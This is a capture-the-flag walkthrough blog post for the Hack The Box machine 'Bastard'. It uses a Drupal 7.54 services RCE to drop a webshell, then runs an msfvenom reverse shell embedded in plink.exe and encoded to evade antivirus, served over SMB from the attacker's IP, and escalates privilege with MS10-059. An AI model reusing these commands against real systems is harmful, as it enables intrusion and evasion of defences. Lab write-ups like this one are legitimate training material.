---
layout: post
title: "HTB-Bastard"
categories: HTB-Walkthrough
---

![bastard](/assets/img/bastard/bastard.png)

Bastard is another HTB machine from the 'retired' list, and it isn't as bad as it sounds.

Nmap first...
`nmap -sV -Pn 10.10.10.9 |tee -a bast.txt`

```

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

Immediate plan of action: Check searchsploit for IIS 7.5, and checkout the website via the browser...

`searchsploit iis 7.5`

```

---------------------------------------------------------- ----------------------------------------
 Exploit Title                                            |  Path
                                                          | (/usr/share/exploitdb/)
---------------------------------------------------------- ----------------------------------------
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities  | exploits/windows/remote/19033.txt

```

This was the only exploit (besides the dos one), so I opened up the browser to see what the web-server was doing...

![bastard-frontpage](/assets/img/bastard/bastard-frontpage.png)

In the source of the frontpage I spot that the site is using Drupal version 7

```

<meta name="Generator" content="Drupal 7 (http://drupal.org)" />

```

Checking this with searchsploit yeilded more results...

`searchsploit drupal 7`

![bastard-drupal-searchsploit](/assets/img/bastard/bastard-drupal-searchsploit.png)


Not sure at this stage exactly what version Drupal 7 we have, I decide to enumerate the server's directories with gobuster.

I often run gobuster with the `-t 50` flag (threads=50), but that threw up lots of errors, so I went with the default 10, then eventually to 5, still a few errors and it was awfully slow:

`gobuster dir -u http://10.10.10.9/ -w /root/wordlists/SecLists/Discovery/Web-Content/common.txt -t 5`

While gobuster was doing its thing, I had a manual browse; `robots.txt` is always the first to try as it can provide a good jumping point for further browsing, but so often reveals nothing...

Not in this case...robots.txt is full of information...I scan the list for interesting destinations.

In the `#files` section there is `/CHANGELOG.txt`, which should be able to give us an accurate version number.


It  informs us that the exact version of drupal is
`Drupal 7.54, 2017-02-01`

Armed with this I look at the searchsploit results again, and see that the options are reduced.

I copied the `Drupal services module RCE` and the `Drupalgeddon3 RCE PoC` (not metasploit version) to my working folder and had a read.

`searchsploit -m 41564`
`searchsploit -m 44542`



############################################


![Incomming!](/assets/img/m.jpg)

<hr width="250" size="6">


I decided to have a go at the drupal services module RCE exploit; it requires modifying, I need to find the rest endpoint.

My gobuster results include ` /rest`
Browsing to the page gets the message:

`Services Endpoint "rest_endpoint" has been setup successfully.`

So I'm able to modify the exploit accordingly

![drupal-exploit](/assets/img/bastard/bastard-drupal-exploit.png)

I changed the php payload to a webshell, that would be executable from the created page sh1n0bi.php.




<h4>msfvenom</h4>
I use msfvenom to craft a payload, I chose a 'known' port thats usually deemed 'safe', but is not in use, I also encrypt it with `shikata_ga_nai` and embed it into a 'safe' binary called `plink.exe`;
hopefully any defences looking for a suspicious signature will not be alerted.

```

msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.16 lport=443 -f exe -e x86/shikata_ga_nai -x /usr/share/windows-binaries/plink.exe -o evil.exe

```

Rather than upload the evil.exe I can serve it to the target with Impacket's smbserver.py



First, run the exploit which creates the webshell.

`php drupal7-services-module-RCE.php`

Second, we have to run smbserver.py and share the folder containing evil.exe.

`python smbserver.py -comment 'My share' Sh1n0bi /tmp/sh1n/`

Third, set an nc listener...
`nc -nlvp 443`

Fourth, execute the evil payload via the created webshell.
`10.10.10.9/sh1n0bi.php?cmd=\\10.10.14.16\Sh1n0bi\evil.exe`

we get a shell...


![smbshare](/assets/img/bastard/bastard-smbshare.png)

![gotshell](/assets/img/bastard/bastard-gotshell.png)

<hr width="250" size="6">


<h3>Privilege Escalation</h3>



I check with `windows-exploit-suggester.py` 

![suggester](/assets/img/bastard/bastard-suggester.png)


I select MS10-059.exe, copy it to my /tmp/sh1n folder as chim.exe


I execute it from the target making sure I start a netcat listener first.

![chim](/assets/img/bastard/bastard-chim.png)

![rootshell](/assets/img/bastard/bastard-rootshell.png)



```

type dimitris\desktop\user.txt
baxxxxxxxxxxxxxxxxxxxxxxxxxxxxa2

```


```

c:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
4bxxxxxxxxxxxxxxxxxxxxxxxxxxxx7c

```

:)
